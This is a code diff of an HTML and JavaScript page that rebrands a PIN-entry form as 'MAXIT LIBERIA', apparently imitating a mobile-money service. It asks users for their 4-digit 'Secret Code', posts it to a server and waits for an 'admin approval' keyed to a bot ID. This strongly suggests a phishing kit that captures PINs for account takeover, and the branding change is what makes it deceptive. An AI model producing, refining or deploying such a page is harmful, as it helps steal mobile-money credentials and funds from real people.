@@ -12,7 +12,7 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -20,34 +20,45 @@
             padding: 20px;
         }
         .container {
-            background: white;
+            background: #111;
             border-radius: 20px;
             padding: 40px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
         }
-        h1 {
-            color: #333;
-            font-size: 24px;
-            margin-bottom: 8px;
+        .logo {
             text-align: center;
+            margin-bottom: 10px;
         }
-        .subtitle {
-            color: #666;
+        .logo h1 {
+            color: #7a3d1c;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+        .logo .sub {
+            color: #7a3d1c;
+            font-size: 12px;
+            letter-spacing: 4px;
+            opacity: 0.7;
+        }
+        .header {
             text-align: center;
             margin-bottom: 30px;
+        }
+        .header h2 {
+            color: #7a3d1c;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .header p {
+            color: #888;
             font-size: 14px;
+            margin-top: 5px;
         }
         .form-group {
             margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 6px;
-            font-size: 14px;
         }
         .pin-container {
             display: flex;
@@ -61,41 +72,40 @@
             text-align: center;
             font-size: 28px;
             font-weight: 600;
-            border: 2px solid #e0e0e0;
+            border: 2px solid #333;
             border-radius: 12px;
             transition: border-color 0.3s, box-shadow 0.3s;
-            background: #fafafa;
+            background: #1a1a1a;
+            color: white;
         }
         .pin-box:focus {
             outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
-            background: white;
+            border-color: #7a3d1c;
+            box-shadow: 0 0 0 3px rgba(122, 61, 28, 0.3);
+            background: #222;
         }
         .pin-box.filled {
-            border-color: #667eea;
-            background: white;
+            border-color: #7a3d1c;
+            background: #222;
         }
         .btn {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #7a3d1c;
             color: white;
             border: none;
             border-radius: 10px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: background 0.3s;
         }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        .btn:hover:not(:disabled) {
+            background: #5a2d12;
         }
         .btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
         }
         .status {
             margin-top: 20px;
@@ -105,76 +115,55 @@
             display: none;
             font-weight: 500;
         }
-        .status.loading {
+        .status.show {
             display: block;
-            background: #f0f0f0;
-            color: #333;
+        }
+        .status.waiting {
+            background: #1a1a2e;
+            color: #ffd93d;
         }
         .status.success {
-            display: block;
-            background: #d4edda;
-            color: #155724;
+            background: #1a2e1a;
+            color: #6bcb77;
         }
         .status.error {
-            display: block;
-            background: #f8d7da;
-            color: #721c24;
+            background: #2e1a1a;
+            color: #ff6b6b;
         }
         .back-link {
             display: block;
             text-align: center;
             margin-top: 20px;
-            color: #667eea;
+            color: #7a3d1c;
             text-decoration: none;
             font-size: 14px;
         }
         .back-link:hover {
             text-decoration: underline;
         }
-        .info-box {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #667eea;
-        }
-        .info-box .label {
-            font-size: 12px;
-            color: #666;
-            font-weight: 600;
-            text-transform: uppercase;
-        }
-        .info-box .value {
-            font-size: 15px;
-            color: #333;
-            margin-top: 2px;
-        }
-        .hidden-input {
-            position: absolute;
-            opacity: 0;
-            width: 0;
-            height: 0;
-            pointer-events: none;
+        .divider {
+            border: none;
+            border-top: 1px solid #333;
+            margin: 20px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 PIN Verification</h1>
-        <p class="subtitle">Enter your 4-digit PIN</p>
-
-        <div class="info-box">
-            <div class="label">Name</div>
-            <div class="value" id="displayName">-</div>
+        <div class="logo">
+            <h1>MAXIT</h1>
+            <div class="sub">LIBERIA</div>
         </div>
-        <div class="info-box">
-            <div class="label">Phone</div>
-            <div class="value" id="displayPhone">-</div>
+
+        <hr class="divider">
+
+        <div class="header">
+            <h2>🔐 Enter Your Secret Code</h2>
+            <p>Please enter your 4-digit PIN</p>
         </div>
 
         <form id="pinForm">
             <div class="form-group">
-                <label>Enter PIN</label>
                 <div class="pin-container">
                     <input type="text" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
                     <input type="text" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]">
@@ -196,10 +185,6 @@
         const phone = urlParams.get('phone');
         const botId = urlParams.get('botId');
 
-        // Display name and phone
-        document.getElementById('displayName').textContent = name || 'Not provided';
-        document.getElementById('displayPhone').textContent = phone || 'Not provided';
-
         // Handle back link
         const backLink = document.getElementById('backLink');
         if (botId) {
@@ -210,6 +195,14 @@
         const form = document.getElementById('pinForm');
         const status = document.getElementById('status');
         const submitBtn = document.getElementById('submitBtn');
+
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = 'status show';
+            if (type) {
+                status.classList.add(type);
+            }
+        }
 
         // Auto-focus next input
         pinInputs.forEach((input, index) => {
@@ -281,12 +274,11 @@
 
             if (pin.length !== 4) {
                 showStatus('Please enter all 4 digits of your PIN.', 'error');
-                // Shake animation for empty boxes
                 pinInputs.forEach(input => {
                     if (!input.value) {
-                        input.style.borderColor = '#dc3545';
+                        input.style.borderColor = '#ff6b6b';
                         setTimeout(() => {
-                            input.style.borderColor = '#e0e0e0';
+                            input.style.borderColor = '#333';
                         }, 1000);
                     }
                 });
@@ -301,7 +293,7 @@
             // Show loading state
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Verifying...';
-            showStatus('Submitting PIN for verification...', 'loading');
+            showStatus('⏳ Waiting for admin approval...', 'waiting');
 
             try {
                 const response = await fetch('/submit-pin', {
@@ -321,65 +313,49 @@
                     throw new Error(data.error || 'Failed to submit PIN');
                 }
 
-                showStatus('✅ PIN submitted for verification! Waiting for admin approval...', 'success');
-                
                 // Poll for approval
-                await pollForPinApproval(data.requestId, botId);
+                const poll = setInterval(async () => {
+                    try {
+                        const r = await fetch(`/check-pin/${data.requestId}`);
+                        const d = await r.json();
+
+                        if (d.approved === true) {
+                            clearInterval(poll);
+                            showStatus('✅ PIN verified! Redirecting...', 'success');
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = '🔐 Verify PIN';
+                            setTimeout(() => {
+                                window.location.href = `/success.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
+                            }, 1500);
+                        }
+
+                        if (d.approved === false) {
+                            clearInterval(poll);
+                            showStatus('❌ PIN verification rejected. Please try again.', 'error');
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = '🔐 Verify PIN';
+                            // Clear PIN boxes
+                            pinInputs.forEach(input => {
+                                input.value = '';
+                                input.classList.remove('filled');
+                            });
+                            pinInputs[0].focus();
+                        }
+
+                    } catch (err) {
+                        clearInterval(poll);
+                        showStatus('⚠️ Connection lost. Please try again.', 'error');
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = '🔐 Verify PIN';
+                    }
+                }, 2000);
 
             } catch (error) {
-                showStatus('❌ Error: ' + error.message, 'error');
+                showStatus('❌ ' + error.message, 'error');
                 submitBtn.disabled = false;
                 submitBtn.textContent = '🔐 Verify PIN';
             }
         });
-
-        async function pollForPinApproval(requestId, botId) {
-            const maxAttempts = 60; // 60 attempts * 3 seconds = 3 minutes
-            let attempts = 0;
-
-            const interval = setInterval(async () => {
-                attempts++;
-                
-                try {
-                    const response = await fetch(`/check-pin/${requestId}`);
-                    const data = await response.json();
-
-                    if (data.approved === true) {
-                        clearInterval(interval);
-                        showStatus('✅ PIN verified! Redirecting to success page...', 'success');
-                        setTimeout(() => {
-                            window.location.href = `/success.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
-                        }, 1500);
-                    } else if (data.approved === false) {
-                        clearInterval(interval);
-                        showStatus('❌ PIN verification rejected by admin. Please try again.', 'error');
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = '🔐 Verify PIN';
-                        // Clear PIN boxes
-                        pinInputs.forEach(input => {
-                            input.value = '';
-                            input.classList.remove('filled');
-                        });
-                        pinInputs[0].focus();
-                    } else if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        showStatus('⏰ Verification timeout. Please try again or contact support.', 'error');
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = '🔐 Verify PIN';
-                    }
-                } catch (error) {
-                    console.error('Polling error:', error);
-                }
-            }, 3000); // Check every 3 seconds
-        }
-
-        function showStatus(message, type) {
-            status.textContent = message;
-            status.className = 'status';
-            if (type) {
-                status.classList.add(type);
-            }
-        }
     </script>
 </body>
 </html>
